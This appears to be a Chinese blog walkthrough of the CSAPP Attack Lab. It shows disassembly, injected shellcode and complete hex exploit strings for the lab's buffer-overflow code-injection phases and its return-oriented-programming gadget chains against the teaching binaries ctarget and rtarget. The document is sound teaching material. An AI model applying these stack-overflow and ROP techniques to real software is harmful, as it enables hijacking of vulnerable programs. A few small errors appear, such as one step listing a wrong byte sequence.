---
title: 《深入理解计算机系统》实验3.Attack Lab
date: 2021-06-02 17:44:12
tags: CSAPP
categories: CSAPP
mathjax: true
---

Attack Lab缓冲区溢出攻击。

<!--more-->

本次实验涉及《深入理解计算机系统》一书的3.10小节，其说明文档参看[这里](http://csapp.cs.cmu.edu/3e/attacklab.pdf)。

### 代码注入（Code Injection）

```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}

void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

#### 任务一

任务描述：当函数getbuf返回后，让ctarget执行函数touch1，而不是继续执行函数test。

```c
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

* 首先，查看函数getbuf的汇编代码：

```assembly
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	ret    
End of assembler dump.
```

在栈上分配了0x28=40个字节。

* 然后，再查看函数touch1的汇编代码：

```assembly
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	call   0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	call   0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	call   0x400e40 <exit@plt>
End of assembler dump.
```

touch1的起始地址为：0x00000000004017c0。因此，只需要使用该地址覆盖函数getbuf的返回地址，在执行完getbuf后，函数touch1就会被调用。

在Attack Lab的说明文档中，有如下说明：

> HEX2RAW expects two-digit hex values separated by one or more white spaces. So if you want to create a byte with a hex value of 0, you need to write it as 00. To create the word 0xdeadbeef you should pass “ef be ad de” to HEX2RAW (note the <strong style='color:red;'>reversal required for little-endian byte ordering</strong>).

 little-endian字节序要求：低位字节排放在内存的低地址端，高位字节排放在内存的高地址端。

因此，构造如下字符串填充栈（前4行可以使用任意字符，这里采用了00）：

```c
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00      // 函数touch1的起始地址
```

最后，使用本实验提供的hex2raw生成最终的攻击字符串，并执行代码注入：

```c
./hex2raw -i solution/phase1_solution.txt | ./ctarget -q
```

* `hex2raw -i`表示从文件中读取字符串
* `ctarget -q`表示不向远程服务器发送结果

#### 任务二

任务描述：当函数getbuf返回后，让ctarget执行函数touch2，而不是继续执行函数test。

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

说明文档中给出的建议如下：

> * You will want to position a byte representation of the address of your injected code in such a way that ret instruction at the end of the code for getbuf will transfer control to it. 
>
> * Recall that the first argument to a function is passed in register %rdi. 
> * Your injected code should set the register to your cookie, and then use a ret instruction to transfer control to the first instruction in touch2.

函数touch2的汇编代码如下：

```assembly
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:	sub    $0x8,%rsp
   0x00000000004017f0 <+4>:	mov    %edi,%edx
   0x00000000004017f2 <+6>:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:	mov    $0x1,%edi
   0x000000000040180e <+34>:	mov    $0x0,%eax
   0x0000000000401813 <+39>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:	mov    $0x2,%edi
   0x000000000040181d <+49>:	call   0x401c8d <validate>
   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:	mov    $0x403110,%esi
   0x0000000000401829 <+61>:	mov    $0x1,%edi
   0x000000000040182e <+66>:	mov    $0x0,%eax
   0x0000000000401833 <+71>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:	mov    $0x2,%edi
   0x000000000040183d <+81>:	call   0x401d4f <fail>
   0x0000000000401842 <+86>:	mov    $0x0,%edi
   0x0000000000401847 <+91>:	call   0x400e40 <exit@plt>
End of assembler dump.
```

与函数touch1相比，touch2多了一个参数val，并且其值必须等于cookie。cookie的值为：

```shell
[hegongshan@hgs attacklab-handout]$ cat cookie.txt 
0x59b997fa
```

因此，可以写出如下的汇编代码：

```assembly
mov $0x59b997fa,%rdi # cookie值作为入参，存入寄存器%rdi中
push $0x4017ec       # 将函数touch2第一条指令的地址压入栈中
ret                  # 将控制传递给函数touch2
```

接着，将上述汇编代码转换为机器代码：

```shell
[hegongshan@hgs solutions]$ gcc -c phase2.s 
[hegongshan@hgs solutions]$ objdump -d phase2.o

phase2.o:	file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
       0:	48 c7 c7 fa 97 b9 59 	mov	$0x59b997fa, %rdi
       7:	68 ec 17 40 00 	pushq	$0x4017ec
       c:	c3 	retq
```

因此，对应的字节序列为：

```c
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3
```

而栈顶地址为：`0x5561dc78`。因此，最终的输入字符串为：

```c
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 // 栈顶地址
```

#### 任务三

任务描述：当函数getbuf返回后，让ctarget执行函数touch3，而不是继续执行函数test。

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char * sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

与任务二的区别在于，函数touch3的入参是一个字符串指针。

> 建议一：You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.” 

根据建议一可知，需要将cookie值（`59b997fa`）转换为十六进制，然后按照从高位到低位的顺序排列，且不包含前缀0x。

> 建议二：Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.

使用`man ascii`命令，可以得到字符串`59b997fa`的十六进制表示：

```c
59b997fa => 35 39 62 39 39 37 66 61
```

在C语言中，字符串需要在末尾补上结束符`'\0'`，其对应的十六进制形式为`0x00`。因此，字符串的完整表示为：

```c
35 39 62 39 39 37 66 61 00
```

> 建议三：Your injected code should set register %rdi to the address of this string.

根据建议三可知，必须将寄存器%rdi的值设置为上述字符串的地址。

> 建议四：When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.

根据建议四可知，当函数hexmatch和strncmp被调用时，getbuf使用的缓冲区会被重写。因此，不能将字符串存放在getbuf的缓冲区中。可以把其存放在test的栈帧中。

getbuf的栈顶地址为`0x5561dc78`，

getbuf的缓冲区在栈中占了40个字节，随后其返回地址又占了8个字节，共计48=0x30个字节。

```c
0x5561dc78 + 0x30 = 0x5561dca8
```

因此，可以将cookie值存放在地址`0x5561dca8`中。

```assembly
(gdb) disas touch3
Dump of assembler code for function touch3:
   0x00000000004018fa <+0>:	push   %rbx
   0x00000000004018fb <+1>:	mov    %rdi,%rbx
   0x00000000004018fe <+4>:	movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:	mov    %rdi,%rsi
   0x000000000040190b <+17>:	mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:	call   0x40184c <hexmatch>
   0x0000000000401916 <+28>:	test   %eax,%eax
   0x0000000000401918 <+30>:	je     0x40193d <touch3+67>
   0x000000000040191a <+32>:	mov    %rbx,%rdx
   0x000000000040191d <+35>:	mov    $0x403138,%esi
   0x0000000000401922 <+40>:	mov    $0x1,%edi
   0x0000000000401927 <+45>:	mov    $0x0,%eax
   0x000000000040192c <+50>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:	mov    $0x3,%edi
   0x0000000000401936 <+60>:	call   0x401c8d <validate>
   0x000000000040193b <+65>:	jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:	mov    %rbx,%rdx
   0x0000000000401940 <+70>:	mov    $0x403160,%esi
   0x0000000000401945 <+75>:	mov    $0x1,%edi
   0x000000000040194a <+80>:	mov    $0x0,%eax
   0x000000000040194f <+85>:	call   0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:	mov    $0x3,%edi
   0x0000000000401959 <+95>:	call   0x401d4f <fail>
   0x000000000040195e <+100>:	mov    $0x0,%edi
   0x0000000000401963 <+105>:	call   0x400e40 <exit@plt>
End of assembler dump.
```

从上述汇编代码可知，函数touch3的起始地址为：`0x00000000004018fa`。

因此，攻击代码为：

```assembly
mov $0x5561dca8, %rdi
push $0x4018fa        # 将函数touch3的起始地址压入栈中
ret                   # 将控制权传递给函数touch3
```

通过汇编和反汇编，可以得到上述代码对应的字节序列（机器码）：

```assembly
[hegongshan@hgs solutions]$ gcc -c phase3.s
[hegongshan@hgs solutions]$ objdump -d phase3.o

phase3.o:	文件格式 elf64-x86-64


Disassembly of section .text:
0000000000000000 <.text>:
       0:	48 c7 c7 a8 dc 61 55 	movq	$1432476840, %rdi
       7:	68 fa 18 40 00 	pushq	$4200698
       c:	c3 	retq
```

因此，最终的攻击字符串为：

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 00
```

### 面向返回编程（Return-Oriented Programming，ROP）

ROP的策略是从现有的程序代码找出这样的字节序列：它可以构成一个或多个指令，且紧随其后的就是指令ret。这种片段被称为gadget。

#### 任务四

任务描述：使用ROP攻击完成任务二，当函数getbuf返回后，让rtarget执行函数touch2，而不是继续执行函数test。

* 使用movq、popq、ret（对应的编码为0xc3）以及nop（对应的编码为0x90，仅使程序计数器加1）四种指令的gadget凑出攻击字符串。

* 只能使用前8个x86-64寄存器，即%rax~%rdi

建议：

* 需要的gadget可以从start_farm到mid_farm之间的函数中找到，

* 只需要两个gadget就可以凑出攻击字符串

从start_farm到mid_farm的汇编代码如下：

```c
getval_142:
  40199a:	b8 fb 78 【90 90】 	movl	$2425387259, %eax
  40199f:	c3】 	retq

addval_273:
  4019a0:	8d 87 【48 89 c7】 【c3】 	leal	-1010333368(%rdi), %eax
  4019a6:	【c3】 	retq

addval_219:
  4019a7:	8d 87 51 73 【58】 【90】 	leal	-1873251503(%rdi), %eax
  4019ad:	【c3】 	retq

setval_237:
  4019ae:	c7 07 【48 89 c7】 c7 	movl	$3351742792, (%rdi)
  4019b4:	【c3】 	retq

setval_424:
  4019b5:	c7 07 54 c2 【58】 92 	movl	$2455290452, (%rdi)
  4019bb:	【c3】 	retq

setval_470:
  4019bc:	c7 07 63 48 8d c7 	movl	$3347925091, (%rdi)
  4019c2:	【c3】 	retq

setval_426:
  4019c3:	c7 07 【48 89 c7】 【90】 	movl	$2428995912, (%rdi)
  4019c9:	【c3】 	retq

getval_280:
  4019ca:	b8 29 【58】 【90】 【c3】 	movl	$3281016873, %eax
  4019cf:	【c3】 	retq
```

根据Writeup给出的编码表可知，在上述代码中，可以使用的字节序列（已使用中括号标出）有：

* `58`：对应指令`popq %rax`；
* `90`：对应指令`nop`
* `c3`：对应指令`ret`
* `48 89 c7`：对应指令`movq %rax, %rdi`。

思路：将cookie值存放在寄存器%rax中，然后将再将%rax中的值复制到%rdi中，作为touch2的入参。汇编代码如下：

```assembly
popq %rax
ret
movq %rax, %rdi
ret
```

* 先看`popq %rax`，根据Writeup给出的编码表，可知其对应的字节序列为：

```assembly
popq %rax       => 58
```

`58`共出现了三次，地址分别为`4019ab`、`4019b9`以及`4019cc`：

```assembly
addval_219:
  4019a7:	8d 87 51 73 【58】 90 	leal	-1873251503(%rdi), %eax
  4019ad:	c3 	retq

setval_424:
  4019b5:	c7 07 54 c2 【58】 92 	movl	$2455290452, (%rdi)
  4019bb:	c3 	retq

getval_280:
  4019ca:	b8 29 【58】 90 c3 	movl	$3281016873, %eax
  4019cf:	c3 	retq
```

在setval_424中，58和c3中间的字节序列为92，既不是代表nop指令的90，也不是代表ret指令的c3，故舍弃。

因此，可选的地址有`4019ab`和`4019cc`。

* 再来看`movq %rax, %rdi`，其对应的字节序列为：

```assembly
movq %rax, %rdi => 48 89 c7
```

`48 89 c7`也出现了三次，地址分别为`4019a2`、`4019b0`以及`4019c5`：

```assembly
addval_273:
  4019a0:	8d 87 【48 89 c7】 c3 	leal	-1010333368(%rdi), %eax
  4019a6:	c3 	retq

setval_237:
  4019ae:	c7 07 【48 89 c7】 c7 	movl	$3351742792, (%rdi)
  4019b4:	c3 	retq

setval_426:
  4019c3:	c7 07 【48 89 c7】 90 	movl	$2428995912, (%rdi)
  4019c9:	c3 	retq
```

在setval_237中，`48 89 c7`和c3中间的字节序列为c7，既不是代表nop指令的90，也不是代表ret指令的c3，故舍弃。

从而，可选地址有`4019a2`和`4019c5`。

因此，最终的攻击字符串为：

```assembly
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 # 从两个地址中任选一个，对应popq %rax
fa 97 b9 59 00 00 00 00 # cookie
a2 19 40 00 00 00 00 00 # 从两个地址中任选一个，对应movq %rax, %rdi
ec 17 40 00 00 00 00 00 # touch2的地址
```

#### 任务五

任务描述：使用ROP攻击完成任务三。允许使用从start_farm到end_farm的所有函数。

建议：标准答案需要8个gadget（有重复）。

从start_farm到mid_farm之间的汇编代码在任务四中已经给出，这里不再赘述。

从mid_farm到end_farm之间的汇编代码如下：

```assembly
add_xy:
  4019d6:	48 8d 04 37 	leaq	(%rdi,%rsi), %rax
  4019da:	c3 	retq

getval_481:
  4019db:	b8 【5c】 【89 c2】 90 	movl	$2428668252, %eax
  4019e0:	c3 	retq

setval_296:
  4019e1:	c7 07 99 d1 90 90 	movl	$2425409945, (%rdi)
  4019e7:	c3 	retq

addval_113:
  4019e8:	8d 87 【89 ce】 78 c9 	leal	-914829687(%rdi), %eax
  4019ee:	c3 	retq

addval_490:
  4019ef:	8d 87 8d d1 【20 db】 	leal	-618606195(%rdi), %eax
  4019f5:	c3 	retq

getval_226:
  4019f6:	b8 【89 d1】 48 c0 	movl	$3225997705, %eax
  4019fb:	c3 	retq

setval_384:
  4019fc:	c7 07 81 d1 【84 c0】 	movl	$3229929857, (%rdi)
  401a02:	c3 	retq

addval_190:
  401a03:	8d 87 41 【48 89 e0】 	leal	-527873983(%rdi), %eax
  401a09:	c3 	retq

setval_276:
  401a0a:	c7 07 88 c2 【08 c9】 	movl	$3372794504, (%rdi)
  401a10:	c3 	retq

addval_436:
  401a11:	8d 87 【89 ce】 90 90 	leal	-1869558135(%rdi), %eax
  401a17:	c3 	retq

getval_345:
  401a18:	b8 【48 89 e0】 c1 	movl	$3252717896, %eax
  401a1d:	c3 	retq

addval_479:
  401a1e:	8d 87 【89 c2】 00 c9 	leal	-922697079(%rdi), %eax
  401a24:	c3 	retq

addval_187:
  401a25:	8d 87 【89 ce】 【38 c0】 	leal	-1070018935(%rdi), %eax
  401a2b:	c3 	retq

setval_248:
  401a2c:	c7 07 81 ce 【08 db】 	movl	$3674787457, (%rdi)
  401a32:	c3 	retq

getval_159:
  401a33:	b8 【89 d1】 【38 c9】 	movl	$3375944073, %eax
  401a38:	c3 	retq

addval_110:
  401a39:	8d 87 c8 【89 e0】 c3 	leal	-1008694840(%rdi), %eax
  401a3f:	c3 	retq

addval_487:
  401a40:	8d 87 【89 c2】 【84 c0】 	leal	-1065041271(%rdi), %eax
  401a46:	c3 	retq

addval_201:
  401a47:	8d 87 【48 89 e0】 c7 	leal	-941586104(%rdi), %eax
  401a4d:	c3 	retq

getval_272:
  401a4e:	b8 99 d1 【08 d2】 	movl	$3523793305, %eax
  401a53:	c3 	retq

getval_155:
  401a54:	b8 【89 c2】 c4 c9 	movl	$3385115273, %eax
  401a59:	c3 	retq

setval_299:
  401a5a:	c7 07 【48 89 e0】 91 	movl	$2447411528, (%rdi)
  401a60:	c3 	retq

addval_404:
  401a61:	8d 87 【89 ce】 92 c3 	leal	-1013789047(%rdi), %eax
  401a67:	c3 	retq

getval_311:
  401a68:	b8 【89 d1】 【08 db】 	movl	$3674788233, %eax
  401a6d:	c3 	retq

setval_167:
  401a6e:	c7 07 【89 d1】 91 c3 	movl	$3281113481, (%rdi)
  401a74:	c3 	retq

setval_328:
  401a75:	c7 07 81 c2 【38 d2】 	movl	$3526935169, (%rdi)
  401a7b:	c3 	retq

setval_450:
  401a7c:	c7 07 09 ce 【08 c9】 	movl	$3372797449, (%rdi)
  401a82:	c3 	retq

addval_358:
  401a83:	8d 87 08 【89 e0】 90 	leal	-1864333048(%rdi), %eax
  401a89:	c3 	retq

addval_124:
  401a8a:	8d 87 【89 c2】 c7 3c 	leal	1019724425(%rdi), %eax
  401a90:	c3 	retq

getval_169:
  401a91:	b8 88 ce 【20 c0】 	movl	$3223375496, %eax
  401a96:	c3 	retq

setval_181:
  401a97:	c7 07 【48 89 e0】 c2 	movl	$3269495112, (%rdi)
  401a9d:	c3 	retq

addval_184:
  401a9e:	8d 87 【89 c2】 60 d2 	leal	-765410679(%rdi), %eax
  401aa4:	c3 	retq

getval_472:
  401aa5:	b8 8d ce 【20 d2】 	movl	$3525365389, %eax
  401aaa:	c3 	retq

setval_350:
  401aab:	c7 07 【48 89 e0】 90 	movl	$2430634312, (%rdi)
  401ab1:	c3 	retq
```

据Writeup给出的编码表可知，在start_farm到end_farm中，可以使用的字节序列（使用中括号标出）有：

```assembly
# 省略了ret、nop以及functional nop指令
# popq指令
58 => popq %rax
5c => popq %rsp

# movq指令
48 89 c7 => movq %rax, %rdi
48 89 e0 => movq %rsp, %rax

# movl指令
89 c2 => movl %eax, %edx
89 ce => movl %ecx, %esi
89 d1 => movl %edx, %ecx
89 e0 => movl %esp, %eax
```

思路：栈的位置是随机的，无法直接得到cookie的起始地址，但可以使用栈顶地址加上偏移量来确定cookie的起始地址。

注意到，在函数add_xy:

```assembly
add_xy:
  4019d6:	48 8d 04 37 	leaq	(%rdi,%rsi), %rax
  4019da:	c3 	retq
```

指令`leaq (%rdi,%rsi), %rax`先将%rdi和%rsi的值相加，再将结果存入%rax中。这正好对应了栈顶地址+偏移量，即将栈顶地址存入%rdi中，将地址偏移量存入%rsi中。

根据前面得出的、本次实验能够使用的gadget，可以写出如下的汇编代码（省略了所有的ret指令）：

```assembly
# 将栈顶地址存入%rdi中
movq %rsp, %rax
movq %rax, %rdi

# 将偏移量存入%esi中
popq %rax
movl %eax, %edx
movl %edx, %ecx
movl %ecx, %esi

# cookie的存储地址=栈顶地址+偏移量
leaq	(%rdi,%rsi), %rax
movq %rax, %rdi
# 函数touch3的起始地址

# cookie的起始地址与返回地址相隔9条指令，而每条指令占8个字节，因此，偏移量为9×8=72=0x48
```

下面，逐一分析这8个gadget：

1.`movq %rsp, %rax`对应的字节序列为`48 89 e0`，共出现了6次：

```assembly
addval_190:
  401a03:	8d 87 41 【48 89 e0】 	leal	-527873983(%rdi), %eax
  401a09:	c3 	retq
  
getval_345:
  401a18:	b8 【48 89 e0】 c1 	movl	$3252717896, %eax
  401a1d:	c3 	retq

addval_201:
  401a47:	8d 87 【48 89 e0】 c7 	leal	-941586104(%rdi), %eax
  401a4d:	c3 	retq

setval_299:
  401a5a:	c7 07 【48 89 e0】 91 	movl	$2447411528, (%rdi)
  401a60:	c3 	retq
  
setval_181:
  401a97:	c7 07 【48 89 e0】 c2 	movl	$3269495112, (%rdi)
  401a9d:	c3 	retq
  
setval_350:
  401aab:	c7 07 【48 89 e0】 90 	movl	$2430634312, (%rdi)
  401ab1:	c3 	retq
```

只有addval_190和setval_350中的字节序列可以使用，起始地址分别为`401a06`和`401aad`。

2.`movq %rax, %rdi`对应的字节序列为`48 89 e0`，共出现了3次：

```assembly
addval_273:
  4019a0:	8d 87 【48 89 c7】 c3 	leal	-1010333368(%rdi), %eax
  4019a6:	c3 	retq

setval_237:
  4019ae:	c7 07 【48 89 c7】 c7 	movl	$3351742792, (%rdi)
  4019b4:	c3 	retq

setval_426:
  4019c3:	c7 07 【48 89 c7】 90 	movl	$2428995912, (%rdi)
  4019c9:	c3 	retq
```

其中，只有addval_273和setval_426中的字节序列可以使用，起始地址分别为`4019a2`和`4019c5`。

3.`popq %rax`对应的字节序列为`58`，共出现了3次：

```assembly
addval_219:
  4019a7:	8d 87 51 73 【58】 90 	leal	-1873251503(%rdi), %eax
  4019ad:	c3 	retq

setval_424:
  4019b5:	c7 07 54 c2 【58】 92 	movl	$2455290452, (%rdi)
  4019bb:	c3 	retq

getval_280:
  4019ca:	b8 29 【58】 90 c3 	movl	$3281016873, %eax
  4019cf:	c3 	retq
```

其中，只有addval_219和getval_280中的字节序列可以使用，起始地址分别为`4019ab`和`4019cc`。

4.`movl %eax, %edx`对应的字节序列为`89 c2`，共出现了次：

```assembly
getval_481:
  4019db:	b8 5c 【89 c2】 90 	movl	$2428668252, %eax
  4019e0:	c3 	retq
  
addval_479:
  401a1e:	8d 87 【89 c2】 00 c9 	leal	-922697079(%rdi), %eax
  401a24:	c3 	retq
  
addval_487:
  401a40:	8d 87 【89 c2】 【84 c0】 	leal	-1065041271(%rdi), %eax
  401a46:	c3 	retq
  
getval_155:
  401a54:	b8 【89 c2】 c4 c9 	movl	$3385115273, %eax
  401a59:	c3 	retq
  
addval_124:
  401a8a:	8d 87 【89 c2】 c7 3c 	leal	1019724425(%rdi), %eax
  401a90:	c3 	retq
  
addval_184:
  401a9e:	8d 87 【89 c2】 60 d2 	leal	-765410679(%rdi), %eax
  401aa4:	c3 	retq
```

其中，只有getval__481和addval_487中的字节序列可以使用，起始地址分别为`4019dd`和`401a42`。

5.`movl %edx, %ecx`对应的字节序列为`89 d1`，共出现了4次：

```assembly
getval_226:
  4019f6:	b8 【89 d1】 48 c0 	movl	$3225997705, %eax
  4019fb:	c3 	retq
  
getval_159:
  401a33:	b8 【89 d1】 【38 c9】 	movl	$3375944073, %eax
  401a38:	c3 	retq
  
getval_311:
  401a68:	b8 【89 d1】 【08 db】 	movl	$3674788233, %eax
  401a6d:	c3 	retq

setval_167:
  401a6e:	c7 07 【89 d1】 91 c3 	movl	$3281113481, (%rdi)
  401a74:	c3 	retq
```

其中，只有getval_159和getval_311中的字节序列可以使用，起始地址分别为`401a34`和`401a69`。

6.`movl %ecx, %esi`对应的字节序列为`89 ce`，共出现了4次：

```assembly
addval_113:
  4019e8:	8d 87 【89 ce】 78 c9 	leal	-914829687(%rdi), %eax
  4019ee:	c3 	retq
  
addval_436:
  401a11:	8d 87 【89 ce】 90 90 	leal	-1869558135(%rdi), %eax
  401a17:	c3 	retq
  
addval_187:
  401a25:	8d 87 【89 ce】 【38 c0】 	leal	-1070018935(%rdi), %eax
  401a2b:	c3 	retq
  
addval_404:
  401a61:	8d 87 【89 ce】 92 c3 	leal	-1013789047(%rdi), %eax
  401a67:	c3 	retq
```

其中，只有addval_436和addval_187中的字节序列可以使用，起始地址分别为`401a13`和`401a27`。

7.`leaq	(%rdi,%rsi), %rax`出现在函数add_xy中：

```assembly
add_xy:
  4019d6:	48 8d 04 37 	leaq	(%rdi,%rsi), %rax
  4019da:	c3 	retq
```

其起始地址为`4019d6`。

8.`movq %rax, %rdi`与第二步相同，可以使用addval_273和setval_426中的字节序列，起始地址分别为`4019a2`和`4019c5`。

综上所述，我们可以得出最终的攻击字符串： 

```assembly
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 # 1.从可选的两个地址中任选一个，对应指令movq %rsp, %rax
a2 19 40 00 00 00 00 00 # 2.从可选的两个地址中任选一个，对应指令movq %rax, %rdi
ab 19 40 00 00 00 00 00 # 3.从可选的两个地址中任选一个，对应指令popq %rax
48 00 00 00 00 00 00 00 # 偏移量=9条指令×8=72=0x48
dd 19 40 00 00 00 00 00 # 4.从可选的两个地址中任选一个，对应指令movl %eax, %edx
34 1a 40 00 00 00 00 00 # 5.从可选的两个地址中任选一个，对应指令movl %edx, %ecx
13 1a 40 00 00 00 00 00 # 6.从可选的两个地址中任选一个，对应指令movl %ecx, %esi
d6 19 40 00 00 00 00 00 # 7.对应指令leaq (%rdi,%rsi), %rax
a2 19 40 00 00 00 00 00 # 8.从可选的两个地址中任选一个，对应指令movq %rax, %rdi
fa 18 40 00 00 00 00 00 # 9.函数touch3的起始地址
35 39 62 39 39 37 66 61 00 # cookie的值3
```

